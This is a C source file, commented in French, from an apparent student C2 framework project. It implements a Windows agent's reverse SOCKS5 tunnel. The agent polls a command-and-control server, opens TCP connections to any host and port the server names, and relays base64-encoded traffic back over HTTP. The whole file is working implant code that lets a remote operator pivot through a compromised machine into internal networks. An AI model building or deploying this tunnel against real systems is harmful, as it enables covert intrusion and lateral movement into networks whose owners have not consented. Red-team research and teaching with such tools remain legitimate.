/*
 * ============================================================
 *  tunnel.c - Client tunnel SOCKS5 inverse (Windows)
 *
 *  Architecture :
 *
 *    thread principal de l'agent (poll_loop)
 *      ?? recoit tunnel_enable > appelle tunnel_start()
 *
 *    tunnel_thread (thread Win32, tourne en arriere-plan)
 *      ?? toutes les 200ms : GET /tunnel/{id}/poll
 *           ?? CONNECT host:port > handle_connect()
 *           ?     ?? ouvre socket TCP + lance reader_thread
 *           ?? DATA b64          > handle_data()
 *           ?     ?? envoie donnees au socket cible
 *           ?? CLOSE             > handle_close()
 *
 *    reader_thread (un par connexion)
 *      ?? recv() bloquant sur socket cible
 *           ?? POST /tunnel/data avec les donnees recues
 *
 *  

 *  Projet  : Framework C2 Modulaire - PFE INPT 2026
 * ============================================================
 */

/* WinSock2 DOIT etre inclus avant windows.h */
#ifdef _WIN32
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <ws2tcpip.h>
#endif

#include "platform.h"
#include "tunnel.h"
#include "http.h"
#include "utils.h"
#include "cJSON.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

/* ============================================================
 *  IMPLEMENTATION WINDOWS UNIQUEMENT
 * ============================================================ */
#ifdef PLATFORM_WINDOWS

#include <windows.h>

/* ?? Constantes ??????????????????????????????????????????????? */
#define TUNNEL_MAX_CONNS     32
#define TUNNEL_POLL_MS       200
#define TUNNEL_TIMEOUT_SEC   60
#define TUNNEL_ID_LEN        17     /* 16 hex + '\0' */
#define TUNNEL_RECV_BUF      65536
#define TUNNEL_CONNECT_TO_MS 10000  /* timeout connexion TCP vers cible */

/* ?? Structure d'une connexion ???????????????????????????????? */
typedef struct {
    char    id[TUNNEL_ID_LEN];  /* tunnel_id unique */
    SOCKET  sock;               /* socket vers la cible */
    int     active;             /* 1 = en cours, 0 = libre */
    HANDLE  reader;             /* handle du reader_thread */
    time_t  last_active;
} TConn;

/* ?? Etat global du tunnel ???????????????????????????????????? */
static TConn             g_conns[TUNNEL_MAX_CONNS];
static CRITICAL_SECTION  g_lock;
static volatile int      g_running  = 0;
static char              g_srv[256] = {0};  /* server_url */
static char              g_aid[16]  = {0};  /* agent_id   */
static HANDLE            g_thread   = NULL;

/* ============================================================
 *  UTILITAIRES : GESTION DES CONNEXIONS
 * ============================================================ */

static TConn *conn_find(const char *id) {
    for (int i = 0; i < TUNNEL_MAX_CONNS; i++)
        if (g_conns[i].active && strcmp(g_conns[i].id, id) == 0)
            return &g_conns[i];
    return NULL;
}

static TConn *conn_alloc(const char *id) {
    for (int i = 0; i < TUNNEL_MAX_CONNS; i++) {
        if (!g_conns[i].active) {
            memset(&g_conns[i], 0, sizeof(TConn));
            memcpy(g_conns[i].id, id, TUNNEL_ID_LEN - 1);
            g_conns[i].id[TUNNEL_ID_LEN - 1] = '\0';
            g_conns[i].sock        = INVALID_SOCKET;
            g_conns[i].active      = 1;
            g_conns[i].last_active = time(NULL);
            return &g_conns[i];
        }
    }
    return NULL;
}

static void conn_free(TConn *c) {
    if (!c) return;
    if (c->sock != INVALID_SOCKET) {
        closesocket(c->sock);
        c->sock = INVALID_SOCKET;
    }
    c->active = 0;
}

/* ============================================================
 *  BASE64 (decodage - b64_encode est deja dans utils.h)
 * ============================================================ */

static unsigned char *tunnel_b64_decode_alloc(const char *in, size_t in_len,
                                               size_t *out_len) {
    if (!in || in_len == 0) { *out_len = 0; return NULL; }

    size_t pad = 0;
    if (in_len >= 1 && in[in_len - 1] == '=') pad++;
    if (in_len >= 2 && in[in_len - 2] == '=') pad++;
    *out_len = (in_len / 4) * 3 - pad;

    unsigned char *out = (unsigned char *)malloc(*out_len + 1);
    if (!out) { *out_len = 0; return NULL; }

    size_t j = 0;
    for (size_t i = 0; i + 3 < in_len; i += 4) {
        int a = B64_DEC[(unsigned char)in[i    ]];
        int b = B64_DEC[(unsigned char)in[i + 1]];
        int c = B64_DEC[(unsigned char)in[i + 2]];
        int d = B64_DEC[(unsigned char)in[i + 3]];
        if (a < 0 || b < 0) break;
        out[j++] = (unsigned char)((a << 2) | (b >> 4));
        if (c >= 0) out[j++] = (unsigned char)(((b & 0xF) << 4) | (c >> 2));
        if (d >= 0) out[j++] = (unsigned char)(((c & 0x3) << 6) | d);
    }
    *out_len = j;
    out[j]   = '\0';
    return out;
}

/* ============================================================
 *  ENVOI DE DONNEES AU SERVEUR
 * ============================================================ */

static void post_tunnel_data(const char *tunnel_id,
                              const char *b64_data,
                              const char *status) {
    char url[512];
    snprintf(url, sizeof(url), "%s/tunnel/data", g_srv);

    cJSON *j = cJSON_CreateObject();
    cJSON_AddStringToObject(j, "agent_id",  g_aid);
    cJSON_AddStringToObject(j, "tunnel_id", tunnel_id);
    cJSON_AddStringToObject(j, "data",      b64_data ? b64_data : "");
    cJSON_AddStringToObject(j, "status",    status);
    char *body = cJSON_PrintUnformatted(j);
    cJSON_Delete(j);

    HttpBuffer resp = {0};
    http_post_json(url, body, &resp);
    free(body);
    if (resp.data) free(resp.data);
}

/* ============================================================
 *  READER THREAD - lit du socket cible et POST au serveur
 * ============================================================ */

typedef struct { char id[TUNNEL_ID_LEN]; SOCKET sock; } ReaderArg;

static DWORD WINAPI reader_thread(LPVOID arg) {
    ReaderArg *ra = (ReaderArg *)arg;
    char   tid[TUNNEL_ID_LEN];
    SOCKET sock;
    memcpy(tid, ra->id, TUNNEL_ID_LEN);   /* tailles identiques - pas de troncature */
    sock = ra->sock;
    free(ra);

    unsigned char *buf = (unsigned char *)malloc(TUNNEL_RECV_BUF);
    if (!buf) return 1;

    while (g_running) {
        int n = recv(sock, (char *)buf, TUNNEL_RECV_BUF, 0);
        if (n <= 0) {
            /* Connexion fermee par la cible */
            post_tunnel_data(tid, NULL, "closed");
            break;
        }

        /* Encoder et envoyer au serveur */
        size_t b64_sz = ((size_t)n + 2) / 3 * 4 + 1;
        char  *b64    = (char *)malloc(b64_sz);
        if (b64) {
            b64_encode(buf, (size_t)n, b64);
            post_tunnel_data(tid, b64, "ok");
            free(b64);
        }

        /* Mise a jour last_active */
        EnterCriticalSection(&g_lock);
        TConn *c = conn_find(tid);
        if (c) c->last_active = time(NULL);
        LeaveCriticalSection(&g_lock);
    }

    free(buf);
    return 0;
}

/* ============================================================
 *  GESTIONNAIRES DE COMMANDES
 * ============================================================ */

/* Argument pour le thread de connexion */
typedef struct {
    char id[TUNNEL_ID_LEN];
    char host[256];
    int  port;
} ConnectArg;

/* ?? connect_thread ?????????????????????????????????????????????
 *
 *  Lance dans un thread separe pour NE PAS bloquer tunnel_thread.
 *  Utilise un connect() non-bloquant + select() avec timeout 10s.
 *  Apres succes, lance reader_thread.
 * ??????????????????????????????????????????????????????????????? */
static DWORD WINAPI connect_thread(LPVOID arg) {
    ConnectArg *ca = (ConnectArg *)arg;
    char tid[TUNNEL_ID_LEN];
    char host[256];
    int  port;
    memcpy(tid, ca->id, TUNNEL_ID_LEN);
    memcpy(host, ca->host, sizeof(host));   /* buffers identiques char[256] */
    port = ca->port;
    free(ca);

    printf("[TUNNEL] CONNECT %s:%d (tid=%s)\n", host, port, tid);
    fflush(stdout);

    /* ?? 1. Resolution DNS ???????????????????????????????????? */
    struct addrinfo hints, *res = NULL;
    char port_str[8];
    memset(&hints, 0, sizeof(hints));
    hints.ai_family   = AF_INET;   /* IPv4 uniquement - plus fiable en LAN */
    hints.ai_socktype = SOCK_STREAM;
    snprintf(port_str, sizeof(port_str), "%d", port);

    if (getaddrinfo(host, port_str, &hints, &res) != 0 || !res) {
        printf("[TUNNEL] DNS echoue pour %s\n", host);
        fflush(stdout);
        post_tunnel_data(tid, NULL, "error");
        return 1;
    }

    SOCKET s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (s == INVALID_SOCKET) {
        freeaddrinfo(res);
        post_tunnel_data(tid, NULL, "error");
        return 1;
    }

    /* ?? 2. Connect non-bloquant + select() timeout 10s ?????? *
     *  SO_SNDTIMEO n'affecte PAS connect() sous Windows.       *
     *  La seule facon fiable : mode non-bloquant + select().   */
    u_long nb = 1;
    ioctlsocket(s, FIONBIO, &nb);

    int rc = connect(s, res->ai_addr, (int)res->ai_addrlen);
    freeaddrinfo(res);

    if (rc == SOCKET_ERROR) {
        int err = WSAGetLastError();
        if (err != WSAEWOULDBLOCK && err != WSAEINPROGRESS) {
            printf("[TUNNEL] connect() echoue immediatement (err=%d)\n", err);
            fflush(stdout);
            closesocket(s);
            post_tunnel_data(tid, NULL, "error");
            return 1;
        }
    }

    /* Attendre que le socket soit pret en ecriture (= connecte) */
    fd_set wfds, efds;
    FD_ZERO(&wfds); FD_ZERO(&efds);
    FD_SET(s, &wfds); FD_SET(s, &efds);
    struct timeval tv = { TUNNEL_CONNECT_TO_MS / 1000, 0 };   /* 10s */

    int sel = select(0, NULL, &wfds, &efds, &tv);
    if (sel <= 0) {
        printf("[TUNNEL] Timeout connect() vers %s:%d (sel=%d)\n", host, port, sel);
        fflush(stdout);
        closesocket(s);
        post_tunnel_data(tid, NULL, "error");
        return 1;
    }
    if (FD_ISSET(s, &efds)) {
        printf("[TUNNEL] Erreur connect() vers %s:%d\n", host, port);
        fflush(stdout);
        closesocket(s);
        post_tunnel_data(tid, NULL, "error");
        return 1;
    }

    /* Verifier SO_ERROR pour s'assurer que la connexion a reussi */
    int opt = 0; int optlen = sizeof(opt);
    getsockopt(s, SOL_SOCKET, SO_ERROR, (char *)&opt, &optlen);
    if (opt != 0) {
        printf("[TUNNEL] SO_ERROR=%d vers %s:%d\n", opt, host, port);
        fflush(stdout);
        closesocket(s);
        post_tunnel_data(tid, NULL, "error");
        return 1;
    }

    /* Repasser en mode bloquant pour recv()/send() */
    nb = 0;
    ioctlsocket(s, FIONBIO, &nb);

    /* ?? 3. Stocker la connexion ?????????????????????????????? */
    EnterCriticalSection(&g_lock);
    TConn *c = conn_alloc(tid);
    if (c) c->sock = s;
    LeaveCriticalSection(&g_lock);

    /* ?? 4. Confirmer au serveur ?????????????????????????????? */
    post_tunnel_data(tid, NULL, "connected");
    printf("[TUNNEL] Connecte a %s:%d\n", host, port);
    fflush(stdout);

    /* ?? 5. Lancer le reader_thread ??????????????????????????? */
    ReaderArg *ra = (ReaderArg *)malloc(sizeof(ReaderArg));
    if (!ra) return 1;
    memcpy(ra->id, tid, TUNNEL_ID_LEN);
    ra->sock = s;

    HANDLE h = CreateThread(NULL, 0, reader_thread, ra, 0, NULL);

    EnterCriticalSection(&g_lock);
    c = conn_find(tid);
    if (c) c->reader = h;
    LeaveCriticalSection(&g_lock);

    return 0;
}

/* handle_connect : non-bloquant - spawn un thread et retourne immediatement */
static void handle_connect(const char *tunnel_id,
                            const char *host, int port) {
    ConnectArg *ca = (ConnectArg *)malloc(sizeof(ConnectArg));
    if (!ca) { post_tunnel_data(tunnel_id, NULL, "error"); return; }

    memcpy(ca->id, tunnel_id, TUNNEL_ID_LEN);
    strncpy(ca->host, host, sizeof(ca->host) - 1);
    ca->host[sizeof(ca->host) - 1] = '\0';
    ca->port = port;

    /* Le thread fait la connexion TCP - tunnel_thread continue de poller */
    CreateThread(NULL, 0, connect_thread, ca, 0, NULL);
}

static void handle_data(const char *tunnel_id, const char *b64_data) {
    EnterCriticalSection(&g_lock);
    TConn *c    = conn_find(tunnel_id);
    SOCKET sock = c ? c->sock : INVALID_SOCKET;
    LeaveCriticalSection(&g_lock);

    if (sock == INVALID_SOCKET || !b64_data) return;

    size_t        data_len = 0;
    unsigned char *data    = tunnel_b64_decode_alloc(b64_data, strlen(b64_data), &data_len);
    if (!data) return;

    send(sock, (char *)data, (int)data_len, 0);
    free(data);

    EnterCriticalSection(&g_lock);
    c = conn_find(tunnel_id);
    if (c) c->last_active = time(NULL);
    LeaveCriticalSection(&g_lock);
}

static void handle_close(const char *tunnel_id) {
    printf("[TUNNEL] CLOSE tid=%s\n", tunnel_id);
    fflush(stdout);
    EnterCriticalSection(&g_lock);
    TConn *c = conn_find(tunnel_id);
    if (c) conn_free(c);
    LeaveCriticalSection(&g_lock);
}

/* ============================================================
 *  THREAD PRINCIPAL DU TUNNEL
 * ============================================================ */

static DWORD WINAPI tunnel_thread(LPVOID arg) {
    (void)arg;
    printf("[TUNNEL] Thread demarre - polling %s toutes les %dms\n",
           g_srv, TUNNEL_POLL_MS);
    fflush(stdout);

    while (g_running) {
        char url[512];
        snprintf(url, sizeof(url), "%s/tunnel/%s/poll", g_srv, g_aid);

        HttpBuffer resp = {0};
        long code = http_get(url, &resp);

        if (code == 200 && resp.data && resp.size > 0) {
            cJSON *j = cJSON_Parse(resp.data);
            if (j) {
                cJSON *cmds = cJSON_GetObjectItemCaseSensitive(j, "commands");
                if (cJSON_IsArray(cmds)) {
                    cJSON *cmd = NULL;
                    cJSON_ArrayForEach(cmd, cmds) {
                        cJSON *type_j = cJSON_GetObjectItemCaseSensitive(cmd, "type");
                        cJSON *tid_j  = cJSON_GetObjectItemCaseSensitive(cmd, "tunnel_id");
                        if (!cJSON_IsString(type_j) || !cJSON_IsString(tid_j))
                            continue;

                        const char *type      = type_j->valuestring;
                        const char *tunnel_id = tid_j->valuestring;

                        if (strcmp(type, "CONNECT") == 0) {
                            cJSON *host_j = cJSON_GetObjectItemCaseSensitive(cmd, "host");
                            cJSON *port_j = cJSON_GetObjectItemCaseSensitive(cmd, "port");
                            if (cJSON_IsString(host_j) && cJSON_IsNumber(port_j))
                                handle_connect(tunnel_id,
                                               host_j->valuestring,
                                               port_j->valueint);
                        } else if (strcmp(type, "DATA") == 0) {
                            cJSON *data_j = cJSON_GetObjectItemCaseSensitive(cmd, "data");
                            if (cJSON_IsString(data_j))
                                handle_data(tunnel_id, data_j->valuestring);
                        } else if (strcmp(type, "CLOSE") == 0) {
                            handle_close(tunnel_id);
                        }
                    }
                }
                cJSON_Delete(j);
            }
        }
        if (resp.data) free(resp.data);

        /* Nettoyage des connexions expirees */
        EnterCriticalSection(&g_lock);
        time_t now = time(NULL);
        for (int i = 0; i < TUNNEL_MAX_CONNS; i++) {
            if (g_conns[i].active &&
                now - g_conns[i].last_active > TUNNEL_TIMEOUT_SEC) {
                printf("[TUNNEL] Timeout tid=%s\n", g_conns[i].id);
                fflush(stdout);
                conn_free(&g_conns[i]);
            }
        }
        LeaveCriticalSection(&g_lock);

        Sleep(TUNNEL_POLL_MS);
    }

    /* Nettoyage final */
    EnterCriticalSection(&g_lock);
    for (int i = 0; i < TUNNEL_MAX_CONNS; i++)
        if (g_conns[i].active) conn_free(&g_conns[i]);
    LeaveCriticalSection(&g_lock);

    printf("[TUNNEL] Thread arrete\n");
    fflush(stdout);
    return 0;
}

/* ============================================================
 *  API PUBLIQUE
 * ============================================================ */

int tunnel_start(const char *server_url, const char *agent_id) {
    if (g_running) return 1;  /* deja actif */

    strncpy(g_srv, server_url, sizeof(g_srv) - 1);
    strncpy(g_aid, agent_id,   sizeof(g_aid) - 1);

    memset(g_conns, 0, sizeof(g_conns));
    InitializeCriticalSection(&g_lock);

    /* WinSock deja initialise par l'agent principal */
    g_running = 1;
    g_thread  = CreateThread(NULL, 0, tunnel_thread, NULL, 0, NULL);
    if (!g_thread) {
        g_running = 0;
        DeleteCriticalSection(&g_lock);
        return 0;
    }
    return 1;
}

void tunnel_stop(void) {
    if (!g_running) return;
    g_running = 0;
    if (g_thread) {
        WaitForSingleObject(g_thread, 5000);
        CloseHandle(g_thread);
        g_thread = NULL;
    }
    DeleteCriticalSection(&g_lock);
}

int tunnel_is_active(void) {
    return g_running;
}

/* ============================================================
 *  STUB LINUX
 * ============================================================ */
#else  /* !PLATFORM_WINDOWS */

int  tunnel_start(const char *s, const char *a) { (void)s; (void)a; return 0; }
void tunnel_stop(void) {}
int  tunnel_is_active(void) { return 0; }

#endif /* PLATFORM_WINDOWS */
